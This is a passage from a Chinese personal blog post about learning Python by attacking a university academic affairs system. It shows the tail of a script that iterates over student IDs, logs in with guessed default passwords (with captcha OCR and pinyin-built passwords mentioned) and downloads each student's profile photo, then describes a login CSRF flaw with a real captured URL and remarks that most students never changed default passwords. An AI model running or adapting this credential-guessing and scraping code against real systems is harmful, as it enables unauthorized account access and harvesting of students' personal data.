<span class="number">0</span></span><br><span class="line">			<span class="keyword">print</span> (str(id)+<span class="string">":密码错误！"</span>)</span><br><span class="line">			<span class="comment">#print postdata["txtMM"]</span></span><br><span class="line">			<span class="comment">#print postdata</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">		<span class="comment"># 请求头像</span></span><br><span class="line">			R_face = S.get(getpicurl,headers=login_heard)</span><br><span class="line">			<span class="keyword">with</span> open(path+<span class="string">"/"</span>+id+<span class="string">".jpg"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">				code.write(R_face.content)</span><br><span class="line">		<span class="comment">#END = S.get(jwclogouturl,headers=login_heard)</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"长度:%d"</span>%changdu</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(way)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> way == <span class="number">1</span>:</span><br><span class="line">		ids = getxx(raw_input(<span class="string">'学号:'</span>))</span><br><span class="line">	<span class="keyword">if</span> way == <span class="number">2</span>:</span><br><span class="line">		gread = input(<span class="string">'   年级:'</span>)</span><br><span class="line">		zhuanye = input(<span class="string">'专业代码:'</span>)</span><br><span class="line">		ClassID = input(<span class="string">'班级序号:'</span>)</span><br><span class="line">		ids = getid_0(gread,zhuanye,ClassID)</span><br><span class="line">	<span class="keyword">elif</span> way == <span class="number">3</span>:</span><br><span class="line">		gread = input(<span class="string">'年级:'</span>)</span><br><span class="line">		ids = getid_1(gread)</span><br><span class="line">	<span class="keyword">return</span> ids</span><br><span class="line"></span><br><span class="line">ids = find(int(input(<span class="string">'查询方式:'</span>)))</span><br><span class="line">len = len(ids)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len):</span><br><span class="line">	id=ids[i][<span class="number">0</span>]</span><br><span class="line">	xiaomin = student(id)</span><br><span class="line">	ClassID= ids[i][<span class="number">1</span>]</span><br><span class="line">	zhuanye=ids[i][<span class="number">2</span>]</span><br><span class="line">	gread=ids[i][<span class="number">3</span>]</span><br><span class="line">	path = <span class="string">"./"</span>+str(gread)+<span class="string">"/"</span>+str(zhuanye)+<span class="string">"/"</span>+str(ClassID)</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(path)):</span><br><span class="line">		os.makedirs(path)</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(path+<span class="string">"/"</span>+id+<span class="string">".jpg"</span>)):</span><br><span class="line">		login(xiaomin,path)</span><br></pre></td></tr></table></figure>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><h3 id="1-登录时验证方式简单，造成csrf"><a href="#1-登录时验证方式简单，造成csrf" class="headerlink" title="1.登录时验证方式简单，造成csrf"></a>1.登录时验证方式简单，造成csrf</h3><p>仔细推敲一下他的逻辑，在认证平台只是通过OSid来识别用户，如果我拿带有我的cookie获得的OSid的url去诱骗其他用户点击，或者只需要用户认证平台的会话处于已经认证的状态，只需要打开我构造好的url即可实现</p>
<p>实现过程：</p>
<p>1.a用户(攻击者)新建个网页打开教务处点击登录，抓包找到这么一个请求<code>http://210.41.224.117/Login/qqLogin.asp?Oid=jxgl%2Ecuit%2Eedu%2Ecn&amp;OSid=594722713</code></p>
<p>2.换个浏览器模拟b用户(受害者)，打开刚刚那个获取的url，点击登录，如果第二个用户本身已经登陆过的话，只需要打开这个链接即可<img src="\images\QQ截图20161210055827.jpg" alt="QQ截图20161210055827"></p>
<p>3.a用户这时候重新点登录，发现已经成功登陆，这里头像没有加载出来的原因是头像都是来自于认证平台，而我们只是获得了教务处的信任</p>
<p><img src="\images\QQ截图20161210060534.jpg" alt="QQ截图20161210060534"></p>
<h3 id="2-要记得修改容易被猜出来的密码"><a href="#2-要记得修改容易被猜出来的密码" class="headerlink" title="2.要记得修改容易被猜出来的密码"></a>2.要记得修改容易被猜出来的密码</h3><p>哈哈不可多言，16级有百分之八九十都没改，15级至少也有百分之六七十了</p>
<h4 id="python学习中遇到的一些问题："><a href="#python学习中遇到的一些问题：" class="headerlink" title="python学习中遇到的一些问题："></a>python学习中遇到的一些问题：</h4><p>1.验证码：使用的pytesseract模块，识别率不高，平均十五个识别出一个</p>
<p>2.汉字转为汉语拼音，构造密码的时候遇到的，找的网上的一段算法</p>
<p>3.主要是把登录逻辑搞清楚，一切都好解决</p>
<h3 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h3><p>sso单点认证：</p>
<p><a href="http://blog.csdn.net/lishehe/article/details/40196353" target="_blank" rel="noopener">http://blog.csdn.net/lishehe/article/details/40196353</a></p>
<p><a href="http://dev.cmcm.com/archives/238" target="_blank" rel="noopener">http://dev.cmcm.com/archives/238</a></p>
<p>oauth：</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html</a></p>
<p>Requests 库的高级用法：</p>
<p><a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html" target="_blank" rel="noopener">http://docs.python-requests.org/zh_CN/latest/user/advanced.html</a></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析过程"><span class="toc-number">2.</span> <span class="toc-text">分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a-大致思路"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">a.大致思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于单点登录SSO"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">关于单点登录SSO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b-思路分析"><span class="toc-number">2.0.0.3.</span> <span class="toc-text">b.思路分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c-实现过程"><span class="toc-number">2.0.0.4.</span> <span class="toc-text">c.实现过程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码"><span class="toc-number">3.</span> <span class="toc-text">代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xx-py"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">xx.py</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#思考"><span class="toc-number">4.</span> <span class="toc-text">思考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-登录时验证方式简单，造成csrf"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.登录时验证方式简单，造成csrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-要记得修改容易被猜出来的密码"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.要记得修改容易被猜出来的密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python学习中遇到的一些问题："><span class="toc-number">4.0.2.1.</span> <span class="toc-text">python学习中遇到的一些问题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接："><span class="toc-number">4.0.3.</span> <span class="toc-text">相关链接：</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&text=Python学习之教务处的登录，以及安全思考"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&is_video=false&description=Python学习之教务处的登录，以及安全思考"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Python学习之教务处的登录，以及安全思考&body=Check out this article: http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&name=Python学习之教务处的登录，以及安全思考&description=&lt;p&gt;最近学习Python，感觉从头学比较枯燥，刚好找到一份资料，可以组合出教务处的默认口令，就打算试试爬一下他们的教务处的头像。&lt;br&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Leej
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


